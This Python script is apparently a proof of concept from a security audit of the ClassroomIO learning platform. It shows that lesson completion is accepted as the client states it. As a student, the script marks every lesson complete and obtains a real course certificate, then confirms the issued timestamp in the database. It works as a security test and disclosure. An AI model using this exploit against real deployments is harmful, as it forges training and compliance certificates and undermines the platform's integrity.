#!/usr/bin/env python3
"""
VULN-035 (F-22) — Client-asserted lesson completion -> self-issued certificate.

Vulnerable code (targets/classroomio/):
  * completion write: packages/core/src/services/lesson/lesson.ts:412-433
      upsertLessonCompletionService trusts the client `isComplete` verbatim (only blocks
      lessons whose completionPolicy === 'video_watch').
  * route:            apps/api/src/routes/course/lesson.ts:275-308  (PUT /:lessonId/completion)
      then fires evaluateCourseCertification(courseId, user.id).
  * certificate claim: apps/api/src/services/course/completion.ts:213-272
      progress% is computed from these self-declared rows (course-completion.ts:11-24);
      once progress >= threshold and there is no requiredExerciseId, the server stamps
      groupmember.certificateEarnedAt via claimMemberCertificateEarned (self-hosted:
      certificates always enabled, completion.ts:278-284).

Class: CWE-602 client-side trust of security-relevant state (business-logic integrity).

The flaw: "lesson complete" is a client assertion, not a server-verified event, and
certification consumes that self-declared progress directly. For a course with lessons
and no required graded exercise (the common case, incl. seeded COMPLIANCE courses), a
student marks every lesson complete and is issued a real certificate with zero work.

Exploitation idea: enroll, PUT completion=true on every lesson, then read the
certification evaluation which stamps `certificateEarnedAt`.

Success proof: progress reaches 100% and `groupmember.certificateEarnedAt` is stamped in
the DB for the attacker, purely from self-declared completions (no exercises, no watching).
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import admin_login, make_student, create_course, log, banner, verdict, rid  # noqa: E402

VULN = "VULN-035"
HERE = os.path.dirname(os.path.abspath(__file__))


def add_lesson(admin, course_id, title, order):
    r = admin.post(f"/course/{course_id}/lesson", org=True,
                   json={"title": title, "courseId": course_id, "order": order, "isUnlocked": True})
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create lesson failed: {r.status_code} {r.text[:300]}")
    data = r.json().get("data", {})
    return data.get("id") or data.get("lesson", {}).get("id")


def main():
    banner(VULN, "Client-asserted lesson completion -> self-issued certificate")
    log("INFO", "upsertLessonCompletionService (lesson.ts:412-433) writes body.isComplete verbatim")

    admin = admin_login()
    course = create_course(admin, title=f"SOC2-SelfIssue {rid('c')}")
    group_id = course["groupId"]

    # Enable a downloadable certificate with the default 100% threshold, no required exercise.
    up = admin.put(f"/course/{course['id']}", org=True,
                   json={"certificate": {"isDownloadable": True, "threshold": 100}})
    log("SETUP", f"course={course['id']} certificate enabled (threshold=100, no requiredExerciseId) -> {up.status_code}")

    # Two lessons, no exercises -> progress is driven purely by lesson completion.
    lessons = [add_lesson(admin, course["id"], f"Module {i} {rid('l')}", i) for i in (1, 2)]
    log("SETUP", f"added {len(lessons)} lessons (no exercises): {lessons}")

    attacker, ainfo = make_student(admin, course_id=course["id"])
    log("SETUP", f"attacker STUDENT {ainfo['user_id']} enrolled; does NO real work")

    # Self-declare every lesson complete.
    for lid in lessons:
        rc = attacker.put(f"/course/{course['id']}/lesson/{lid}/completion", org=True, json={"isComplete": True})
        log("STEP", f"PUT /course/{course['id']}/lesson/{lid}/completion {{isComplete:true}} -> {rc.status_code}")

    # Certification evaluation (synchronously stamps certificateEarnedAt when eligible).
    ev = attacker.get(f"/course/{course['id']}/certification-evaluation", org=True)
    ev_data = ev.json().get("data", {}) if ev.status_code == 200 else {}
    progress = ev_data.get("progressPercent")
    eligible = ev_data.get("eligibleForCertificate")
    earned_api = ev_data.get("certificateEarnedAt")
    log("STEP", f"GET /course/{course['id']}/certification-evaluation -> progress={progress}% "
                f"eligible={eligible} certificateEarnedAt={earned_api}")

    # Ground truth: the earned timestamp persisted on the attacker's groupmember row.
    earned_db = None
    from _common import psql
    out = psql(f"select coalesce(certificate_earned_at::text,'') from groupmember "
               f"where profile_id='{ainfo['user_id']}' and group_id='{group_id}';")
    earned_db = out.strip() if out else ""
    log("INFO", f"DB groupmember.certificate_earned_at = {earned_db!r}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### mark each lesson complete purely from the client (no work done)\n")
        for lid in lessons:
            f.write(f"PUT http://localhost:21527/course/{course['id']}/lesson/{lid}/completion HTTP/1.1\n"
                    f"Content-Type: application/json\nCookie: classroomio.session_token=<attacker student>\n\n"
                    f'{{"isComplete":true}}\n\n')
        f.write(f"### progress -> 100% and certificate is self-issued:\n"
                f"GET http://localhost:21527/course/{course['id']}/certification-evaluation HTTP/1.1\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(json.dumps(ev_data, indent=2) + "\n\n")
        f.write(f"DB groupmember.certificate_earned_at = {earned_db!r}\n")

    if progress == 100 and eligible and earned_db:
        log("PROOF", f"attacker self-declared {len(lessons)} lesson completions (no exercises, no video watch) "
                     f"-> progress 100%, eligibleForCertificate=true, and groupmember.certificateEarnedAt was "
                     f"stamped in the DB ({earned_db}) — a real certificate earned with zero work")
        verdict(VULN, "CONFIRMED", "self-declared completion issues a genuine certificate / fake compliance record")
        log("OK", "exploit confirmed — certification consumes client-asserted completion directly")
        sys.exit(0)

    verdict(VULN, "FAILED", f"progress={progress} eligible={eligible} earned_db={earned_db!r}")
    log("FAIL", "certificate was not self-issued from client-asserted completion")
    sys.exit(1)


if __name__ == "__main__":
    main()
